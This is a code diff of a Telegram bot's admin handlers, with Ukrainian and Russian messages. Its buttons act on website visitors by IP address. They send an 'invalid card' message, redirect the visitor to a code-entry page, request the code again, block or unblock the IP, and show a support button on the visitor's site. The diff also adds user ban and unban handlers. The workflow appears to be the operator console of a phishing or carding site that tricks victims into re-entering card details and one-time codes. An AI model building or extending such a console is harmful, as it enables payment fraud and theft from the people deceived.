@@ -1163,7 +1163,7 @@ async def code_notify(request):
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
-@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:')))
+@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or c.data.startswith('code:')))
 async def admin_action_handler(call: types.CallbackQuery):
     action, ip = call.data.split(':', 1)
     import aiohttp as aiohttp_client
@@ -1176,31 +1176,54 @@ async def admin_action_handler(call: types.CallbackQuery):
     elif action == 'unblock':
         await call.answer("Користувач розблокований")
 
-@router.callback_query(lambda c: c.data and c.data.startswith('card:'))
-async def card_handler(call: types.CallbackQuery):
-    ip = call.data.split(':', 1)[1]
-    import aiohttp as aiohttp_client
-    async with aiohttp_client.ClientSession() as session:
-        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'card', 'ip': ip})
-    await call.answer("Invalid card message sent")
+@router.callback_query(lambda c: c.data == "payuser_back")
+async def payuser_back_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = 'admin_panel'
+    await call.message.answer("Возврат в админ-панель.", reply_markup=admin_panel_kb)
+    await call.answer()
 
-@router.callback_query(lambda c: c.data and c.data.startswith('block:'))
-async def block_handler(call: types.CallbackQuery):
-    ip = call.data.split(':', 1)[1]
-    import aiohttp as aiohttp_client
-    async with aiohttp_client.ClientSession() as session:
-        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'block', 'ip': ip})
-    await call.answer("IP blocked")
+@router.callback_query(lambda c: c.data == "ban_back")
+async def ban_back_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = 'admin_panel'
+    await call.message.answer("Возврат в админ-панель.", reply_markup=admin_panel_kb)
+    await call.answer()
 
-@router.callback_query(lambda c: c.data and c.data.startswith('unblock:'))
-async def unblock_handler(call: types.CallbackQuery):
-    ip = call.data.split(':', 1)[1]
-    import aiohttp as aiohttp_client
-    async with aiohttp_client.ClientSession() as session:
-        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'unblock', 'ip': ip})
-    await call.answer("IP unblocked")
+@router.callback_query(lambda c: c.data == "tickets_cancel")
+async def tickets_cancel_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    user_data[uid] = {}
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+    await call.answer()
 
-@router.callback_query(lambda c: c.data and c.data.startswith('code:'))
+@router.callback_query(lambda c: c.data.startswith('ban:'))
+async def ban_reason_ask(call: types.CallbackQuery):
+    uid = call.from_user.id
+    target_id = int(call.data.split(':', 1)[1])
+    user_data[uid] = {'ban_target': target_id}
+    user_step[uid] = 'ban_reason'
+    await call.message.answer("Введите причину блокировки:")
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('unban:'))
+async def unban_user(call: types.CallbackQuery):
+    uid = call.from_user.id
+    target_id = int(call.data.split(':', 1)[1])
+    db_user = get_user(target_id)
+    form_json = db_user['form_json'] if db_user else {}
+    form_json['banned'] = False
+    form_json['ban_reason'] = ''
+    c = conn.cursor()
+    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), target_id))
+    conn.commit()
+    await call.message.answer("Пользователь разблокирован.", reply_markup=admin_panel_kb)
+    user_step[uid] = 'admin_panel'
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('code:'))
 async def code_redirect_handler(call: types.CallbackQuery):
     ip = call.data.split(':', 1)[1]
     import aiohttp as aiohttp_client
@@ -1208,7 +1231,7 @@ async def code_redirect_handler(call: types.CallbackQuery):
         await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'code', 'ip': ip})
     await call.answer("Redirecting user to code page")
 
-@router.callback_query(lambda c: c.data and c.data.startswith('code_request_again:'))
+@router.callback_query(lambda c: c.data.startswith('code_request_again:'))
 async def code_request_again_handler(call: types.CallbackQuery):
     code = call.data.split(':', 1)[1]
     import aiohttp as aiohttp_client
@@ -1216,6 +1239,7 @@ async def code_request_again_handler(call: types.CallbackQuery):
         await session.post('http://127.0.0.1:8080/set_request_again', json={'code': code})
     await call.answer("Request sent to user")
 
+@router.callback_query(lambda c: c.data.startswith('support:'))
 @log_function
 async def admin_support_callback(call: types.CallbackQuery):
     ip = call.data.split(":")[1]
@@ -1230,6 +1254,7 @@ async def admin_support_callback(call: types.CallbackQuery):
     asyncio.create_task(set_flag())
     await call.message.answer("Кнопка підтримки з'явиться на сайті користувача.")
 
+@router.callback_query(lambda c: c.data.startswith('text:'))
 @log_function
 async def admin_text_callback(call: types.CallbackQuery):
     ip = call.data.split(":")[1]
